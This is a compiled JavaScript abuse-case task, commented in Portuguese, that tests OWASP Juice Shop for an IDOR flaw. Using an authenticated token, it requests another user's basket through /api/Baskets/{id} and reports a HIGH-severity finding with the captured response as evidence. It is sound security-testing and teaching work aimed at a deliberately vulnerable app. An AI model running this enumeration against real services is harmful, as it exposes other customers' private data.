"use strict";
/**
 * executor/tasks/AbuseIDOR.ts
 * ---------------------------------------------------------------
 * Abuse Case: IDOR (Insecure Direct Object Reference) no Carrinho
 *
 * Testa se um usuário autenticado (customer) consegue acessar o
 * carrinho de outros usuários simplesmente enumerando o BasketId
 * na URL da API.
 *
 * Em uma aplicação segura, GET /api/Baskets/1 deveria retornar 403
 * se o usuário autenticado não for o dono do carrinho 1.
 * No Juice Shop (intencionalmente vulnerável), retorna 200.
 *
 * Juice Shop Challenge: "Access someone else's basket"
 * Categoria OWASP: A01:2021 – Broken Access Control (IDOR)
 * ---------------------------------------------------------------
 */
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.abuseIDOR = abuseIDOR;
const axios_1 = __importDefault(require("axios"));
async function abuseIDOR(jwt, baseUrl) {
    const headers = {
        'Authorization': `Bearer ${jwt}`,
        'Content-Type': 'application/json',
    };
    try {
        // Passo 1: descobre o ID do carrinho do usuário atual
        const whoamiRes = await axios_1.default.get(`${baseUrl}/rest/user/whoami`, {
            headers,
            validateStatus: () => true,
            timeout: 10_000,
        });
        const myUserId = whoamiRes.data?.user?.id ?? 2;
        // Passo 2: tenta acessar carrinho de outro usuário
        // Se o userId do customer for 2, tenta o carrinho 1 (provavelmente do admin)
        const targetBasketId = myUserId === 1 ? 2 : 1;
        const response = await axios_1.default.get(`${baseUrl}/api/Baskets/${targetBasketId}`, {
            headers,
            validateStatus: () => true,
            timeout: 10_000,
        });
        if (response.status === 200 && response.data?.data) {
            return {
                title: `IDOR — Acesso ao Carrinho de Outro Usuário (Basket #${targetBasketId})`,
                severity: 'HIGH',
                category: 'BLV_IDOR_BASKET',
                description: `Usuário autenticado (ID=${myUserId}) conseguiu acessar o carrinho ` +
                    `de outro usuário (Basket ID=${targetBasketId}) via GET /api/Baskets/${targetBasketId}. ` +
                    'O servidor não verifica se o BasketId pertence ao usuário da sessão.',
                steps: [
                    `GET ${baseUrl}/rest/user/whoami → userId=${myUserId}`,
                    `GET ${baseUrl}/api/Baskets/${targetBasketId} (carrinho de outro usuário)`,
                    `Servidor respondeu HTTP ${response.status} — acesso permitido`,
                ],
                evidence: JSON.stringify(response.data).substring(0, 400),
                discoveredAt: new Date(),
            };
        }
        return null;
    }
    catch (err) {
        console.warn(`[Task] AbuseIDOR falhou: ${err.message}`);
        return null;
    }
}
//# sourceMappingURL=AbuseIDOR.js.map